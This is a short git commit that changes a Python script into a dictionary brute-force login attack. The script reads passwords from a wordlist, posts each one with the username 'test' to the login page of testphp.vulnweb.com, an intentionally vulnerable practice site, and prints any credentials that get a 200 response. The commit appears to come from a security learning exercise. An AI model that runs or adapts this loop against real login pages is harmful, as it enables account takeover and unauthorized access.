1e2a8f8db2a36a686f137ae75961a0671c482bf9
JonnyHam <jonajonkim@gmail.com>
2023-03-06 02:34:46 -0600

    Put in working request code

--- main.py
+++ main.py
@@ -1,2 +1,13 @@
 import requests
-print(requests.get("http://google.com").text)
+
+
+wordlist = "book2.txt"
+username= "test"
+url="http://testphp.vulnweb.com/userinfo.php"
+with open(wordlist) as thefile:
+    for line in thefile:
+        password = line.rstrip() # rstrip removes trailing newlines from an input (before this 'line' is "word\n")
+        payload = {"uname":username, "pass":password}
+        request = requests.post (url, data=payload, allow_redirects=False)
+        if request. status_code == 200:
+            print(username + "logged in with " + password)
